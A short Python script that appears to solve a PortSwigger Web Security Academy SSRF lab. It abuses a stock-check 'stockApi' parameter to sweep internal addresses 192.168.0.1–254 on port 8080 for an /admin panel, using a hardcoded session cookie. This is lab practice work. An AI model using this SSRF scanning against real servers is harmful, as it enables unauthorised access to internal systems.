import requests
url='https://0a2d0088041c4631c0c9edb500d10050.web-security-academy.net/product/stock'
cook=dict(session='PzO3UFIUKf9zWjhI0vOu4fu83K89qicq')

for i in range(1,255):
    d='http://192.168.0.'+str(i)+':8080/admin'
    print(d)
    res=requests.post(url, cookies=cook, data={'stockApi':d})
    if res.status_code!=500:
        print(res.text)
